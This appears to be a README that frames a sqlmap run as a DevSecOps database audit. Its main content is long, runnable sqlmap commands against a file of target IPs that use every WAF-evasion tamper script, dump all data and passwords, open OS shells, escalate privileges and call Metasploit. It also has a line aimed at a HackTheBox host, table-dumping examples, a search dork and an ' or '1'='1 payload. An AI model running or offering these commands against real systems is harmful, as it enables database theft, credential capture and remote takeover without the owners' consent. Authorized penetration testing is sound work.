This project verify that your DataBases are under compliant with the actual DevSecOps MSB

Let’s audit Our Application with https://sqlmap.org {1.5.1.17#dev}

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

## 1. Install python 2.7

https://gist.github.com/4k4xs4pH1r3/2196035667b41107d903ebc5a771d956

#

## 2. Install sqlmap

       apt install sqlmap -y && cp -r /usr/share/sqlmap /usr/share/sqlmap_bck && rm -r /usr/share/sqlmap && git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /usr/share/sqlmap && sqlmap --update && sqlmap --version

#

## Generate IP addresses file of your applications (targets)

    cd /root && mkdir SA && cd SA && mkdir ad && nano ~/SA/ad/ad_ips

## Create the Pipeline CI/CD with metasploit

    nano /root/SA/ad/SA_sqli.sh

#

    sudo apt install neofetch screenfetch -y
    neofetch
    screenfetch
    sqlmap -f -b -o -m /root/SA/ad/ad_ips -t /root/.sqlmap/output/sqlmap_scan -s -a --prefix="--%20', '%20%20', '-- ', ' '" --suffix="-- " --batch --crawl=1337 --crawl-exclude="logout" --forms --randomize=yes --answers="keep testing=Y,optimize=Y,sitemap=Y,follow=Y,extending=N,skip further tests=N,exploit=Y" --cookie=jsessionid=12345 --dump-all --exclude-sysdbs --random-agent --threads=10 --risk=3 --level=5 --delay=3 --timeout=37 --retries=3 --dbs --dbms=mssql --os=Linux --count --hostname --current-user --current-db --passwords --binary-fields --tables --columns --schema --is-dba --users --privileges --roles --common-tables --common-columns --comments --shared-lib --parse-errors --drop-set-cookie --time-sec=17 --ignore-proxy --ignore-timeouts --randomize 7 --hpp --null-connection --invalid-bignum --invalid-logical --invalid-string --charset="0123456789abcdef" --encoding=GBK --technique BEUSTQ --hex --tamper=0eunion,apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,binary,bluecoat,chardoubleencode,charencode,charunicodeencode,charunicodeescape,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,equaltorlike,escapequotes,greatest,halfversionedmorekeywords,hex2char,hexentities,htmlencode,if2case,ifnull2casewhenisnull,ifnull2ifisnull,informationschemacomment,least,lowercase,luanginx,misunion,modsecurityversioned,modsecurityzeroversioned,multiplespaces,ord2ascii,overlongutf8,overlongutf8more,percentage,plus2concat,plus2fnconcat,randomcase,randomcomments,schemasplit,scientific,sleep2getlock,sp_password,space2comment,space2dash,space2hash,space2morecomment,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,space2randomblank,substring2leftright,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor --os-shell --os-pwn --os-smbrelay --os-bof --priv-esc --reg-read --ignore-timeouts --udf-inject --where=DUMPWHERE --dump-format=SQLITE --msf-path /usr/bin --tmp-dir=/root/.sqlmap/history --beep --dependencies --unstable --alert=x -v 7

#

## Create the Pipeline CI/CD without metasploit

    nano /root/SA/ad/SA_sqli.sh

#

    sudo apt install neofetch -y
    neofetch
    sudo sqlmap -f -b -o -m ~/SA/ad/ad_ips -t ~/.sqlmap/output/sqlmap_scan -s -a --prefix="--%20', '%20%20', '-- ', ' '" --suffix="-- " --batch --crawl=13 --crawl-exclude="logout" --forms --randomize=yes --answers="keep testing=Y,optimize=Y,sitemap=Y,follow=Y,extending=N,skip further tests=N,exploit=Y" --cookie=jsessionid=12345 --dump-all --exclude-sysdbs --random-agent --threads=10 --risk=3 --level=5 --delay=1 --timeout=15 --retries=2  --dbs --dbms=mssql --os=Linux --count --hostname --current-user --current-db --passwords --binary-fields --tables --columns --schema --is-dba --users --privileges --roles --common-tables --common-columns --comments --shared-lib --parse-errors --drop-set-cookie --time-sec=17 --ignore-proxy --ignore-timeouts --randomize 3 --hpp --null-connection --invalid-bignum --invalid-logical --invalid-string --charset="0123456789abcdef" --encoding=GBK --technique BEUSTQ --hex --tamper=0eunion,apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,binary,bluecoat,chardoubleencode,charencode,charunicodeencode,charunicodeescape,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,equaltorlike,escapequotes,greatest,halfversionedmorekeywords,hex2char,hexentities,htmlencode,if2case,ifnull2casewhenisnull,ifnull2ifisnull,informationschemacomment,least,lowercase,luanginx,misunion,modsecurityversioned,modsecurityzeroversioned,multiplespaces,ord2ascii,overlongutf8,overlongutf8more,percentage,plus2concat,plus2fnconcat,randomcase,randomcomments,schemasplit,scientific,sleep2getlock,sp_password,space2comment,space2dash,space2hash,space2morecomment,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,space2randomblank,substring2leftright,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor --os-shell --os-pwn --os-smbrelay --os-bof --priv-esc --reg-read --ignore-timeouts --udf-inject --where=DUMPWHERE --dump-format=SQLITE --tmp-dir=~/.sqlmap/history --beep --dependencies --unstable --alert=x -v 6

    sqlmap -u 'http://imagetok.htb:32531/' --level=5 --risk=3 --privileges --current-user --hostname --random-agent --current-db --dump --columns --schema --roles --comments --passwords --users --tables --is-dba --count -b --dbs --mobile --flush-session --beep --cleanup --fresh-queries --threads=10

## Start & Monitoring of the Pipeline CI/CD

       cd ~/SA/ad/ && chmod +x SA_sqli.sh && ./SA_sqli.sh

#

       tail -f /root/.sqlmap/output/sqlmap_scan

## 3. Analize/Purge the Injections Results

of each host that you are looking for (CSV format)
Include: Target URL; Place; Parameter; Technique(s) and Note(s) at

       cd
       cd /root/.sqlmap/output/

#

#

#

# Additional commands

    -p username --url="http://yourtarget.com//?post=1" --data "username=admin&password=pass"

    -D dbname -T tablename -C id -C username -C password

# Supported DBMSes are as follows:

Firebird, H2, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase.

    --dbms=MySQL

    --no-cast

    --no-escape

    --charset 'ascii'

    --predict-output

    --skip-waf

    --eta

    --sqlmap-shell

    --sql-shell


    sqlmap.py -u website –dbs

    -D acuart –tables

    -D acuart -T users –columns

    -D acuart -T users -C name,email,phone -dump


    #
    #
    #
    $ curl --header 'Host: www.example.com' 'https://127.0.0.1/' -v -k

    :)

inurl:website.test/login.asp

' or '1'='1
